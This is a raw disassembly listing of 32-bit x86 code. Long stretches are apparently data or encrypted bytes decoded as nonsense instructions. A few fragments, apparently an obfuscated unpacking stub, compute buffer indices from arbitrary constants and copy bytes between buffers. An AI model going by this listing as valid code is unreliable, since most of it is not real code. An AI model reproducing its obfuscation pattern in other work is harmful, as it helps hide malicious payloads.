  4150fa:	mov    ah,0xca
  4150fc:	shr    BYTE PTR [ebx+esi*2-0x72],1
  415100:	pop    ds
  415101:	cwde   
  415102:	sub    DWORD PTR [edi],0x511330c0
  415108:	cmc    
  415109:	shl    BYTE PTR [edx-0x79a72c6b],1
  41510f:	fcmovb st,st(6)
  415111:	jmp    0x7e59:0x2935b5bc
  415118:	ret    
  415119:	xchg   BYTE PTR [ebx],ch
  41511b:	jl     0x4150fc
  41511d:	mov    al,0x27
  41511f:	arpl   WORD PTR [ecx],cx
  415121:	mov    dh,0x59
  415123:	or     BYTE PTR [edx+0x6bdbf196],dh
  415129:	(bad)  
  41512a:	jmp    DWORD PTR [edi+0x28269402]
  415130:	or     eax,0xffe0d661
  415135:	sbb    eax,0x2f28cc
  41513a:	out    dx,al
  41513b:	lds    edx,FWORD PTR [esi]
  41513d:	call   0x5a531bb
  415142:	jecxz  0x41511a
  415144:	ss fwait
  415146:	cmp    DWORD PTR [ebp-0x52],0x22
  41514a:	mov    ch,0x8c
  41514c:	pop    ebx
  41514d:	or     bl,al
  41514f:	fiadd  DWORD PTR [edi]
  415151:	dec    edi
  415152:	lahf   
  415153:	shr    DWORD PTR [ebp-0xfb752a9],1
  415159:	in     eax,0x72
  41515b:	pop    ds
  41515c:	lahf   
  41515d:	dec    ebp
  41515e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41515f:	pop    esp
  415160:	pop    esp
  415161:	add    BYTE PTR [ecx-0xc277396],0x51
  415168:	nop
  415169:	shl    DWORD PTR [edi-0x14b4180],1
  41516f:	fbld   TBYTE PTR [ebx+0x7d4e7e82]
  415175:	cmc    
  415176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415177:	and    eax,0xe9c91530
  41517c:	and    ebx,ebp
  41517e:	xchg   DWORD PTR [edi+0x312768d0],ebp
  415184:	adc    bh,BYTE PTR [ebp+0x74ec4b62]
  41518a:	mov    al,0x32
  41518c:	leave  
  41518d:	ins    BYTE PTR es:[edi],dx
  41518e:	aas    
  41518f:	pop    esi
  415190:	hlt    
  415191:	dec    esp
  415192:	mov    ds:0xfcdc592c,al
  415197:	push   edx
  415198:	add    al,0xb1
  41519a:	sub    ah,BYTE PTR [esi+0xa]
  41519d:	lea    esi,ds:0x648e7e71
  4151a3:	in     al,dx
  4151a4:	out    0xd2,al
  4151a6:	cwde   
  4151a7:	jno    0x41518c
  4151a9:	inc    edx
  4151aa:	xchg   edx,eax
  4151ab:	shr    DWORD PTR [ebx-0x217b1df9],cl
  4151b1:	pop    edx
  4151b2:	dec    ebx
  4151b3:	mov    edx,0xe6a077e6
  4151b8:	addr16 je 0x415187
  4151bb:	jle    0x415207
  4151bd:	xchg   ecx,eax
  4151be:	add    dh,BYTE PTR [eax]
  4151c0:	cdq    
  4151c1:	lods   eax,DWORD PTR ds:[esi]
  4151c2:	inc    eax
  4151c3:	mov    ecx,0xb8dacf51
  4151c8:	test   BYTE PTR [ecx],dh
  4151ca:	test   eax,edx
  4151cc:	push   es
  4151cd:	call   0x5c8a58dc
  4151d2:	pop    edx
  4151d3:	call   0x1465a663
  4151d8:	sub    DWORD PTR [eax],ecx
  4151da:	sbb    DWORD PTR [eax+0x4],edx
  4151dd:	mov    eax,DWORD PTR [esp+0xc]
  4151e1:	or     DWORD PTR [eax],0xca7da575
  4151e7:	or     DWORD PTR [eax+0x4],0x9c1b89e8
  4151ee:	lea    eax,[esp+0x18]
  4151f2:	push   eax
  4151f3:	lea    eax,[esp+0x24]
  4151f7:	push   eax
  4151f8:	call   0x4127df
  4151fd:	mov    eax,DWORD PTR [esp+0x18]
  415201:	mov    ecx,DWORD PTR [esp+0x1c]
  415205:	push   DWORD PTR [ebp+0x18]
  415208:	mov    ebx,DWORD PTR [ebp+0xc]
  41520b:	push   DWORD PTR [ebp+0x14]
  41520e:	mov    esi,DWORD PTR [ebp+0x8]
  415211:	push   DWORD PTR [ebp+0x10]
  415214:	push   DWORD PTR [esp+0x20]
  415218:	push   DWORD PTR [esp+0x20]
  41521c:	push   DWORD PTR [esp+0x38]
  415220:	push   DWORD PTR [esp+0x38]
  415224:	call   0x401000
  415229:	pop    esi
  41522a:	pop    ebx
  41522b:	mov    esp,ebp
  41522d:	pop    ebp
  41522e:	ret    0x14
  415231:	push   ebp
  415232:	mov    ebp,esp
  415234:	sub    esp,0x30
  415237:	mov    DWORD PTR [ebp-0x24],0x7c16
  41523e:	mov    DWORD PTR [ebp-0x20],0x53bd
  415245:	mov    DWORD PTR [ebp-0x18],0x3bd5
  41524c:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  415253:	mov    DWORD PTR [ebp-0xc],0x4b9d
  41525a:	mov    DWORD PTR [ebp-0x8],0x7e48
  415261:	mov    DWORD PTR [ebp-0x4],0x604b
  415268:	mov    DWORD PTR [ebp-0x30],0x5b69
  41526f:	mov    DWORD PTR [ebp-0x2c],0x4521
  415276:	mov    DWORD PTR [ebp-0x28],0x2979
  41527d:	mov    DWORD PTR [ebp-0x14],0x9e8
  415284:	mov    DWORD PTR [ebp-0x10],0x40e5
  41528b:	mov    ecx,DWORD PTR [ebp-0x4]
  41528e:	mov    eax,DWORD PTR [ebp-0x8]
  415291:	add    ecx,0x1d04
  415297:	xor    ecx,eax
  415299:	mov    eax,DWORD PTR [ebp-0xc]
  41529c:	and    ecx,0x6f79
  4152a2:	imul   ecx,eax
  4152a5:	xor    ecx,0xe33ab1
  4152ab:	push   esi
  4152ac:	mov    DWORD PTR [ebp-0x4],0x5989
  4152b3:	mov    DWORD PTR [ebp-0x8],0x402c1
  4152ba:	mov    DWORD PTR [ebp-0xc],0x4114
  4152c1:	mov    eax,DWORD PTR [ebp-0xc]
  4152c4:	mov    esi,DWORD PTR [ebp-0x8]
  4152c7:	xor    edx,edx
  4152c9:	sub    eax,0x6cb6
  4152ce:	div    esi
  4152d0:	mov    edx,DWORD PTR [ebp-0x4]
  4152d3:	mov    esi,DWORD PTR [ebp+0xc]
  4152d6:	or     eax,edx
  4152d8:	xor    eax,0x67f1
  4152dd:	mov    edx,ecx
  4152df:	sub    edx,eax
  4152e1:	mov    DWORD PTR [ebp-0x4],edx
  4152e4:	mov    eax,DWORD PTR [ebp-0x4]
  4152e7:	mov    edx,DWORD PTR [ebp-0x4]
  4152ea:	mov    dl,BYTE PTR [edx+esi*1]
  4152ed:	mov    esi,DWORD PTR [ebp+0x8]
  4152f0:	mov    BYTE PTR [eax+esi*1],dl
  4152f3:	jmp    0x415646
  4152f8:	mov    cl,0x4a
  4152fa:	aas    
  4152fb:	(bad)  
  4152fc:	sbb    bh,BYTE PTR [edx-0x5f]
  4152ff:	sub    dh,BYTE PTR [esi+0x267e1b8c]
  415305:	in     eax,dx
  415306:	mov    ch,0x7c
  415308:	mov    esp,0xb518160e
  41530d:	adc    bl,BYTE PTR [eax]
  41530f:	sbb    BYTE PTR [edi+0xee0808e],al
  415315:	xchg   esp,eax
  415316:	mov    ds:0x7c485a25,al
  41531b:	mov    esp,DWORD PTR [esi-0x1fe1e264]
  415321:	xchg   ecx,eax
  415322:	xchg   ebx,eax
  415323:	std    
  415324:	nop
  415325:	aad    0x4a
  415327:	mov    ds:0xbc3be8ba,al
  41532c:	jle    0x415391
  41532e:	dec    eax
  41532f:	popa   
  415330:	les    ebp,FWORD PTR ds:0x9b3f6679
  415336:	dec    ebp
  415337:	fisub  DWORD PTR [ebx+ebp*2]
  41533a:	into   
  41533b:	movq   QWORD PTR ds:0xb32f7d0f,mm7
  415342:	sar    BYTE PTR [esp+ebp*8],1
  415345:	and    bl,al
  415347:	cld    
  415348:	or     ch,dh
  41534a:	sub    BYTE PTR [ebp+0x7c],bl
  41534d:	or     eax,0xb25908f9
  415352:	pop    edi
  415353:	mov    al,0xdd
  415355:	and    DWORD PTR [esi+ebx*1-0x46],eax
  415359:	test   eax,0xdb6954d7
  41535e:	pop    esp
  41535f:	mov    ebp,DWORD PTR [ecx]
  415361:	dec    ecx
  415362:	or     eax,0xe959608a
  415367:	sub    esp,ebp
  415369:	ret    0xb6b9
  41536c:	cmp    ch,BYTE PTR [edi+eiz*2-0x4b749677]
  415373:	mov    DWORD PTR [ecx+0x53b82475],ecx
  415379:	ins    BYTE PTR es:[edi],dx
  41537a:	ja     0x4153b1
  41537c:	xchg   edi,eax
  41537d:	jecxz  0x41533e
  41537f:	ret    
  415380:	lds    ebx,FWORD PTR [edx-0x48]
  415383:	jne    0x41530b
  415385:	adc    al,0xc
  415387:	mov    ebp,0x15319287
  41538c:	xor    eax,0x74edb23f
  415391:	test   eax,0x5d7e98df
  415396:	ins    DWORD PTR es:[edi],dx
  415397:	or     al,0xea
  415399:	jp     0x4153e1
  41539b:	sbb    ah,BYTE PTR [edi]
  41539d:	fmul   st,st(6)
  41539f:	(bad)  
  4153a0:	ja     0x41539f
  4153a2:	std    
  4153a3:	jno    0x415373
  4153a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153a6:	sub    al,0x92
  4153a8:	fsub   DWORD PTR [edi]
  4153aa:	sbb    ebp,DWORD PTR [edx-0x391c828a]
  4153b0:	sub    BYTE PTR [ebp+0x7baf59cd],dl
  4153b6:	addr16 dec esi
  4153b8:	mov    ebp,0x4e8fa684
  4153bd:	stc    
  4153be:	call   0x23d150c0
  4153c3:	shr    BYTE PTR ds:[esi+0xc90d87],1
  4153ca:	enter  0x440b,0xee
  4153ce:	cmc    
  4153cf:	push   eax
  4153d0:	(bad)
  4153d4:	or     dl,ch
  4153d6:	push   es
  4153d7:	std    
  4153d8:	cmp    esp,DWORD PTR [edi+0x5a]
  4153db:	xchg   edi,eax
  4153dc:	ret    0xe7f2
  4153df:	fcmovbe st,st(3)
  4153e1:	aad    0x98
  4153e3:	pop    ds
  4153e4:	lahf   
  4153e5:	or     DWORD PTR [ebx],esp
  4153e7:	cld    
  4153e8:	push   edi
  4153e9:	idiv   DWORD PTR [ebx+0x4e8ef5eb]
  4153ef:	lods   eax,DWORD PTR ds:[esi]
  4153f0:	sub    DWORD PTR [ecx],esp
  4153f2:	out    dx,eax
  4153f3:	je     0x415377
  4153f5:	sbb    dh,BYTE PTR [ecx]
  4153f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153f8:	jnp    0x41543d
  4153fa:	xlat   BYTE PTR ds:[ebx]
  4153fb:	fwait
  4153fc:	jns    0x4153ab
  4153fe:	fnstsw WORD PTR [esi-0x2d]
  415401:	push   cs
  415402:	pop    ecx
  415403:	push   esp
  415404:	hlt    
  415405:	fwait
  415406:	xchg   ecx,eax
  415407:	mov    dl,0x4e
  415409:	call   0xf3037879
  41540e:	xchg   ebp,eax
  41540f:	out    dx,al
  415410:	push   esi
  415411:	push   eax
  415412:	add    al,0x90
  415414:	das    
  415415:	mov    ds:0xb82a6e18,al
  41541a:	ins    BYTE PTR es:[edi],dx
  41541b:	xor    edx,ebx
  41541d:	enter  0x59d3,0xe4
  415421:	adc    dl,BYTE PTR [ebx-0x54a5d795]
  415427:	inc    edi
  415428:	push   cs
  415429:	sub    al,BYTE PTR [ebx]
  41542b:	push   esi
  41542c:	sub    BYTE PTR [ecx],ch
  41542e:	rcr    esp,cl
  415430:	icebp  
  415431:	pop    esi
  415432:	jo     0x4153c0
  415434:	or     ebx,edi
  415436:	xchg   BYTE PTR [eax+edi*2],cl
  415439:	add    BYTE PTR [ebp-0x7b2c6209],cl
  41543f:	ds push edx
  415441:	mov    esp,0x195f858c
  415446:	lea    ecx,[edi+0x2cbadba6]
  41544c:	aam    0x70
  41544e:	dec    DWORD PTR fs:[eax-0x64]
  415452:	test   BYTE PTR [edi+eax*2+0x74a478cc],ch
  415459:	mov    cl,0x1d
  41545b:	inc    edx
  41545c:	xchg   ecx,eax
  41545d:	mov    ah,0x5c
  41545f:	ja     0x415495
  415461:	loopne 0x41548a
  415463:	mov    ah,0x11
  415465:	test   BYTE PTR [edx-0x1e],ch
  415468:	mov    ds:0xf7398492,al
  41546d:	lea    ebp,[esp+esi*8]
  415470:	popf   
  415471:	loope  0x415428
  415473:	inc    eax
  415474:	xchg   DWORD PTR [ebx-0x40931ae3],edx
  41547a:	or     eax,0xde7f5b7f
  41547f:	popa   
  415480:	jbe    0x415425
  415482:	cmp    DWORD PTR [ecx+ebp*2+0x2a],ecx
  415486:	(bad)  
  415487:	fdivr  DWORD PTR [edx+0x51a31edf]
  41548d:	add    ch,ah
  41548f:	out    0xfc,eax
  415491:	cmp    DWORD PTR ds:0x6443b5a3,edi
  415497:	rcl    DWORD PTR [eax+0xe363807],0xdf
  41549e:	xchg   DWORD PTR [ebp+0x1bd823fd],esp
  4154a4:	push   edx
  4154a5:	ja     0x4154cc
  4154a7:	cmp    edi,edi
  4154a9:	ficom  DWORD PTR [edx+esi*4-0x3d9564e4]
  4154b0:	xchg   edx,eax
  4154b1:	cmp    al,0xff
  4154b3:	out    0x76,al
  4154b5:	pushf  
  4154b6:	cmp    BYTE PTR [ebx],bl
  4154b8:	pusha  
  4154b9:	in     eax,0x77
  4154bb:	es inc ebx
  4154bd:	clc    
  4154be:	test   edi,ebx
  4154c0:	shl    BYTE PTR ds:0xb0663bb,1
  4154c6:	jecxz  0x4154ed
  4154c8:	inc    ebx
  4154c9:	mov    eax,0xe4c9b111
  4154ce:	lea    ebx,[edx-0x4d532e]
  4154d4:	or     BYTE PTR [edx],ah
  4154d6:	xor    ecx,edi
  4154d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154d9:	inc    esi
  4154da:	mov    esi,0xb0cfb8e8
  4154df:	cmp    BYTE PTR [edx+0x1b2c63d0],bl
  4154e5:	imul   eax,esi,0x4
  4154e8:	pop    si
  4154ea:	shr    ecx,cl
  4154ec:	sbb    DWORD PTR [edi-0x1f],ecx
  4154ef:	push   edx
  4154f0:	or     edi,DWORD PTR [ebp-0x25fa05a0]
  4154f6:	add    cl,BYTE PTR [ecx-0x1e]
  4154f9:	lods   al,BYTE PTR ds:[esi]
  4154fa:	cmp    dh,BYTE PTR [ecx+eax*4-0x12a89f4a]
  415501:	adc    DWORD PTR [edi-0x25],ebp
  415504:	(bad)  
  415505:	xchg   edx,eax
  415506:	addr16 mov eax,ds:0x44ff
  41550a:	ror    ah,0x4d
  41550d:	fwait
  41550e:	mov    esi,0xd0e4e3d8
  415513:	sub    ah,bl
  415515:	loop   0x415566
  415517:	(bad)  [ecx+0x47]
  41551a:	add    cl,ah
  41551c:	push   0x19cebbc4
  415521:	out    0xb1,eax
  415523:	mov    bl,0xe7
  415525:	(bad)  
  415526:	lahf   
  415527:	sbb    DWORD PTR ds:0xcdbae719,ebp
  41552d:	scas   eax,DWORD PTR es:[edi]
  41552e:	sbb    eax,0x8e3c1205
  415533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415534:	adc    eax,0xa203638f
  415539:	adc    bl,BYTE PTR [edi]
  41553b:	push   cs
  41553c:	jmp    0x41556f
  41553e:	jne    0x415503
  415540:	xor    esi,DWORD PTR [edx]
  415542:	sahf   
  415543:	packssdw mm5,mm5
  415546:	or     BYTE PTR [ebx],ah
  415548:	les    ebp,FWORD PTR [ecx+0x2552e863]
  41554e:	xchg   ebx,esp
  415550:	popa   
  415551:	outs   dx,DWORD PTR ds:[esi]
  415552:	pop    eax
  415553:	ja     0x4154d5
  415555:	neg    BYTE PTR [ebx-0x59d0f12f]
  41555b:	jle    0x41556c
  41555d:	(bad)  
  41555e:	iret   
  41555f:	daa    
  415560:	(bad)  
  415562:	xor    ebx,ebx
  415564:	call   0x12c2:0x494bed29
  41556b:	clc    
  41556c:	push   esi
  41556d:	and    DWORD PTR [edi],ebx
  41556f:	shl    DWORD PTR [edi-0x508b3c56],1
  415575:	popf   
  415576:	xor    al,0xaf
  415578:	mov    ds:0x5b723881,eax
  41557d:	imul   edx,DWORD PTR [eax+0xe],0x3720ed6a
  415584:	lds    ebx,FWORD PTR [edx+0x11]
  415587:	jp     0x4155d9
  415589:	pushf  
  41558a:	rcl    dh,1
  41558c:	lock ror DWORD PTR [edi-0x3db6abef],cl
  415593:	lods   al,BYTE PTR ds:[esi]
  415594:	call   0x940f3e44
  415599:	push   esi
  41559a:	push   esi
  41559b:	cli    
  41559c:	(bad)  
  41559d:	push   0xfffffff4
  41559f:	sbb    DWORD PTR [eax-0x274d0a43],0x75
  4155a6:	data16 jge 0x4155ce
  4155a9:	pop    es
  4155aa:	or     DWORD PTR ds:0xbe41d5ae,esp
  4155b0:	ins    DWORD PTR es:[edi],dx
  4155b1:	add    DWORD PTR [esi],ecx
  4155b3:	leave  
  4155b4:	(bad)  
  4155b5:	mov    dl,0x86
  4155b7:	adc    edx,DWORD PTR [edi]
  4155b9:	jge    0x415549
  4155bb:	in     eax,0xa7
  4155bd:	stos   BYTE PTR es:[edi],al
  4155be:	iret   
  4155bf:	push   0x29
  4155c1:	xchg   ebx,eax
  4155c2:	inc    ebx
  4155c3:	dec    edx
  4155c4:	xchg   edx,eax
  4155c5:	sub    al,0xf1
  4155c7:	adc    esp,DWORD PTR [esi+0x36]
  4155ca:	sbb    ebx,ecx
  4155cc:	rsqrtps xmm5,xmm4
  4155cf:	cmp    BYTE PTR [edx+edi*2+0x56],ch
  4155d3:	test   eax,0xa815fcf4
  4155d8:	and    dh,al
  4155da:	dec    edx
  4155db:	dec    ecx
  4155dc:	xchg   edx,eax
  4155dd:	int3   
  4155de:	jmp    0x41556e
  4155e0:	jb     0x415612
  4155e2:	popa   
  4155e3:	retf   0x9629
  4155e6:	mov    ebp,0x64c98ea3
  4155eb:	push   ebx
  4155ec:	and    DWORD PTR [ebx],ecx
  4155ee:	jne    0x415608
  4155f0:	sbb    dh,BYTE PTR [edi]
  4155f2:	and    DWORD PTR [edi+0x48eb9b24],0x3b18d1c8
  4155fc:	iret   
  4155fd:	xchg   edi,eax
  4155fe:	jl     0x415663
  415600:	int3   
  415601:	into   
  415602:	pop    ds
  415603:	and    al,0x37
  415605:	repz cmp ch,BYTE PTR [edx]
  415608:	and    BYTE PTR [edi],0x41
  41560b:	arpl   WORD PTR [edx-0x536e4e99],sp
  415611:	out    0x2f,eax
  415613:	enter  0xf5e5,0xf2
  415617:	dec    edx
  415618:	shl    DWORD PTR [ebx+0x3a],cl
  41561b:	in     al,dx
  41561c:	jo     0x4155d3
  41561e:	xchg   ecx,eax
  41561f:	cli    
  415620:	jl     0x4155f4
  415622:	aas    
  415623:	push   ecx
  415624:	xchg   esp,eax
  415625:	mov    ah,0x5f
  415627:	jne    0x415605
  415629:	ss cmp al,0xca
  41562c:	movntps XMMWORD PTR [edi-0x7cff697f],xmm0
  415633:	lea    edi,[edx-0x7c1011ed]
  415639:	pop    eax
  41563a:	mov    ah,0xbf
  41563c:	repnz mov gs,WORD PTR es:[eax+0x2a]
  415641:	push   ds
  415642:	adc    al,0x21
  415644:	cmp    al,0xee
  415646:	mov    eax,DWORD PTR [ebp-0x10]
  415649:	mov    edx,DWORD PTR [ebp-0x14]
  41564c:	imul   eax,eax,0x43bd290
  415652:	and    eax,edx
  415654:	or     eax,0x1a40
  415659:	xor    eax,0x1ac1
  41565e:	add    ecx,eax
  415660:	mov    eax,DWORD PTR [ebp-0x18]
  415663:	mov    edx,0x7380
  415668:	sub    edx,eax
  41566a:	add    edx,DWORD PTR [ebp-0x1c]
  41566d:	jmp    0x4159c0
  415672:	pop    esp
  415673:	pushf  
  415674:	lds    eax,FWORD PTR [ebp+eax*2+0x1c]
  415678:	pop    esp
  415679:	pushf  
  41567a:	push   ss
  41567b:	cwde   
  41567c:	pop    ebx
  41567d:	jo     0x4156de
  41567f:	ja     0x4156dc
  415681:	jo     0x4156db
  415683:	or     BYTE PTR [esi],dl
  415685:	sbb    BYTE PTR [ebp+0x66181812],dh
  41568b:	bound  esp,QWORD PTR [ebx]
  41568d:	cs std 
  41568f:	pushf  
  415690:	in     eax,dx
  415691:	(bad)  
  415692:	lahf   
  415693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415694:	std    
  415695:	int    0xc7
  415697:	dec    edi
  415698:	xchg   esi,eax
  415699:	push   edx
  41569a:	inc    ebx
  41569b:	or     ah,dh
  41569d:	sbb    DWORD PTR [edi-0x36b7eeb],eax
  4156a3:	sbb    eax,0xde37e33a
  4156a8:	fld    TBYTE PTR [ebx+0xa]
  4156ab:	cli    
  4156ac:	hlt    
  4156ad:	sahf   
  4156ae:	clc    
  4156af:	outs   dx,BYTE PTR ds:[esi]
  4156b0:	je     0x4156af
  4156b2:	frstor [ebx+edi*4]
  4156b5:	loope  0x415700
  4156b7:	xchg   ebx,eax
  4156b8:	je     0x4156cf
  4156ba:	adc    BYTE PTR [edi-0x10189c0b],dl
  4156c0:	pop    ds
  4156c1:	add    DWORD PTR [edx],ebp
  4156c3:	inc    esi
  4156c4:	mov    cs,WORD PTR [ebp+eax*4-0x7b]
  4156c8:	jno    0x415725
  4156ca:	(bad)  
  4156cc:	sub    al,dh
  4156ce:	sbb    al,0xcf
  4156d0:	push   edi
  4156d1:	mov    bh,0x61
  4156d3:	sbb    BYTE PTR [ecx-0x7c],0xb4
  4156d7:	iret   
  4156d8:	sub    al,0xad
  4156da:	xor    eax,0x55540944
  4156df:	es mov ah,0x4f
  4156e2:	jns    0x415666
  4156e4:	xor    al,0xd1
  4156e6:	and    dh,BYTE PTR [esi]
  4156e8:	stc    
  4156e9:	lahf   
  4156ea:	cwde   
  4156eb:	sub    ecx,ebp
  4156ed:	xor    esi,DWORD PTR es:[eax]
  4156f0:	test   BYTE PTR [edx+0x2c1b26b6],cl
  4156f6:	jp     0x415720
  4156f8:	es int3 
  4156fa:	mov    fs,WORD PTR [edx+0x4c4070d2]
  415700:	push   eax
  415701:	(bad)  
  415704:	enter  0xcd50,0x98
  415708:	call   ebx
  41570a:	fistp  WORD PTR [ecx]
  41570c:	clc    
  41570d:	xchg   BYTE PTR [eax],ch
  41570f:	sub    BYTE PTR [eax+0x15d8c6d7],ch
  415715:	pop    esp
  415716:	imul   eax,DWORD PTR [edi-0x6d],0xf28beb09
  41571d:	fnstsw WORD PTR [edi+0x2b]
  415720:	jmp    0xff7:0xb91e97be
  415727:	lods   al,BYTE PTR ds:[esi]
  415728:	adc    ebp,0x74
  41572b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41572c:	aaa    
  41572d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41572e:	mul    DWORD PTR [ebp+0x38]
  415731:	push   ecx
  415732:	scas   eax,DWORD PTR es:[edi]
  415733:	xor    BYTE PTR [edi+0x38],0x43
  415737:	sahf   
  415738:	out    dx,al
  415739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41573a:	fist   WORD PTR [ebx+0x48]
  41573d:	xchg   DWORD PTR [edx],edi
  41573f:	pushf  
  415740:	mov    ebp,0x659347bb
  415745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415746:	jecxz  0x4156f4
  415748:	jl     0x415772
  41574a:	std    
  41574b:	jge    0x415733
  41574d:	enter  0xb8e9,0xe6
  415751:	adc    BYTE PTR [eax+0x36],dh
  415754:	mov    ds:0xd8200e,al
  415759:	daa    
  41575a:	loopne 0x415710
  41575c:	(bad)  
  41575d:	mov    edx,0x973b2a76
  415762:	jmp    0xe09e:0xeec866db
  415769:	cmp    BYTE PTR [ecx],cl
  41576b:	icebp  
  41576c:	inc    eax
  41576d:	sar    DWORD PTR [esi+0x39],1
  415770:	mov    esi,0xc8022a9b
  415775:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415776:	out    dx,eax
  415777:	ja     0x415723
  415779:	fmul   DWORD PTR [eax+0x63]
  41577c:	icebp  
  41577d:	in     al,dx
  41577e:	cwde   
  41577f:	jno    0x4157aa
  415781:	out    0x72,eax
  415783:	(bad)  [edi]
  415785:	and    eax,0xa69aacef
  41578a:	fild   DWORD PTR [edx+0x782cd592]
  415790:	inc    ebx
  415791:	fs scas eax,DWORD PTR es:[edi]
  415793:	(bad)  
  415794:	stos   BYTE PTR es:[edi],al
  415795:	popf   
  415796:	push   cs
  415797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415798:	neg    BYTE PTR [ebx+0x6a3d1516]
  41579e:	pop    esp
  41579f:	stc    
  4157a0:	icebp  
  4157a1:	pop    ds
  4157a2:	inc    ecx
  4157a3:	hlt    
  4157a4:	pop    esi
  4157a5:	mov    ch,0x60
  4157a7:	pusha  
  4157a8:	jecxz  0x4157fd
  4157aa:	adc    DWORD PTR [esi+ebx*8],esp
  4157ad:	cwde   
  4157ae:	test   al,0x5e
  4157b0:	add    ebx,DWORD PTR [ecx]
  4157b2:	test   DWORD PTR [ebx],ebx
  4157b4:	mov    ah,al
  4157b6:	and    al,0xef
  4157b8:	cmp    DWORD PTR [eax+0x65],ebp
  4157bb:	inc    eax
  4157bc:	adc    eax,0xa95a7ab8
  4157c1:	or     al,0x88
  4157c3:	cmp    DWORD PTR ds:0xc241fa39,0x5c44baab
  4157cd:	imul   ebp,eax,0x1b
  4157d0:	adc    cl,BYTE PTR [edx+ebx*2]
  4157d3:	mov    dh,BYTE PTR [ebp+0x68]
  4157d6:	ret    
  4157d7:	add    esp,esp
  4157d9:	leave  
  4157da:	dec    ecx
  4157db:	cmp    al,BYTE PTR [edx+0x2c7c4f72]
  4157e1:	in     eax,0x0
  4157e3:	shl    DWORD PTR [edi-0x6f],0x2b
  4157e7:	in     al,dx
  4157e8:	mov    esp,0xd2e5c21c
  4157ed:	repnz and bl,0x35
  4157f1:	jge    0x415805
  4157f3:	mov    BYTE PTR [eax+0x475bc5c],cl
  4157f9:	les    edi,FWORD PTR [edi]
  4157fb:	fdivr  st(2),st
  4157fd:	pop    esi
  4157fe:	imul   ebx,DWORD PTR [ecx-0x63],0xffffff83
  415802:	ja     0x415809
  415804:	(bad)  
  415805:	out    dx,al
  415806:	call   DWORD PTR [edx+0x13]
  415809:	out    0x58,al
  41580b:	mov    ecx,0xe28461bf
  415810:	gs adc eax,0x831721d5
  415816:	xor    dh,BYTE PTR [ebp+0x1b]
  415819:	mov    dh,0x4d
  41581b:	ror    BYTE PTR [ecx],0x7
  41581e:	imul   edi,DWORD PTR [edx],0xffffffcf
  415821:	pop    ebp
  415822:	paddsb mm6,QWORD PTR [edx]
  415825:	sub    BYTE PTR [ebx],dl
  415827:	lods   eax,DWORD PTR ds:[esi]
  415828:	xor    eax,0x12a1fae0
  41582d:	mov    ebp,0xae0df663
  415832:	std    
  415833:	ret    
  415834:	lahf   
  415835:	mov    ebp,0xadba930a
  41583a:	mov    ds:0x7e406f1f,eax
  41583f:	int3   
  415840:	pop    esp
  415841:	aaa    
  415842:	jae    0x415889
  415844:	daa    
  415845:	shl    DWORD PTR [edi-0x328d8416],0xfd
  41584c:	iret   
  41584d:	loop   0x4157fb
  41584f:	xchg   BYTE PTR [edx-0x2ef2fdab],al
  415855:	sub    BYTE PTR [eax-0x78],cl
  415858:	imul   esp,DWORD PTR [edi-0x11],0x29
  41585c:	in     eax,0xb2
  41585e:	cmp    eax,0xccdf4e7e
  415863:	cld    
  415864:	push   0xbf8c8fe9
  415869:	xchg   esp,eax
  41586a:	mov    al,ds:0xb9cd07c5
  41586f:	sub    DWORD PTR [ecx],edi
  415871:	jne    0x415814
  415873:	push   0xa0e7a0d6
  415878:	mov    cl,0x76
  41587a:	pop    ecx
  41587b:	inc    ebp
  41587c:	jmp    0x7f5a:0xdfb3202
  415883:	mov    ds:0x60cdc727,eax
  415888:	lods   eax,DWORD PTR ds:[esi]
  415889:	and    al,0xca
  41588b:	rcl    BYTE PTR [ebp+edx*1-0x6c],cl
  41588f:	adc    DWORD PTR ds:0x96fafa31,esp
  415895:	push   eax
  415896:	pusha  
  415897:	loope  0x4158d6
  415899:	push   esp
  41589a:	mov    eax,ds:0x55be82e7
  41589f:	and    ecx,DWORD PTR [ebx+0x41]
  4158a2:	test   DWORD PTR [ebp+0x35735b2b],edx
  4158a8:	shl    BYTE PTR [ebx],1
  4158aa:	inc    esp
  4158ab:	(bad)  
  4158ad:	jns    0x415841
  4158af:	mov    DWORD PTR [ebx-0x9],ebx
  4158b2:	push   es
  4158b3:	mov    dh,0xa2
  4158b5:	xchg   BYTE PTR [esi+ebx*8+0x1089fb49],bh
  4158bc:	push   ss
  4158bd:	xor    BYTE PTR [edi],bh
  4158bf:	inc    eax
  4158c0:	dec    eax
  4158c1:	mov    dh,0x3f
  4158c3:	rcr    DWORD PTR [ebx],1
  4158c5:	cmc    
  4158c6:	in     eax,0x47
  4158c8:	sbb    DWORD PTR [edi],esp
  4158ca:	push   es
  4158cb:	cld    
  4158cc:	push   ss
  4158cd:	div    DWORD PTR ds:0x1326d42a
  4158d3:	enter  0x7018,0x24
  4158d7:	mov    ah,0x28
  4158d9:	or     edx,DWORD PTR [edx+0x30]
  4158dc:	pop    esi
  4158dd:	nop
  4158de:	fnstsw WORD PTR [ebx+0xd]
  4158e1:	js     0x415873
  4158e3:	xor    al,0x64
  4158e5:	mov    ch,0xb4
  4158e7:	mov    ch,0x61
  4158e9:	or     DWORD PTR [eax-0xd7cd5b8],esp
  4158ef:	mov    bh,0xb4
  4158f1:	cmp    DWORD PTR [ebp+0x4d],ebx
  4158f4:	push   cs
  4158f5:	aam    0x71
  4158f7:	je     0x415912
  4158f9:	jno    0x4158f9
  4158fb:	dec    ecx
  4158fc:	(bad)  
  4158fd:	sbb    ch,BYTE PTR [edi+0x7ffe3a2f]
  415903:	ret    0xbab0
  415906:	or     eax,0xbb52b923
  41590b:	cmp    al,0x9c
  41590d:	call   0xef78b24b
  415912:	jge    0x415986
  415914:	lods   eax,DWORD PTR es:[esi]
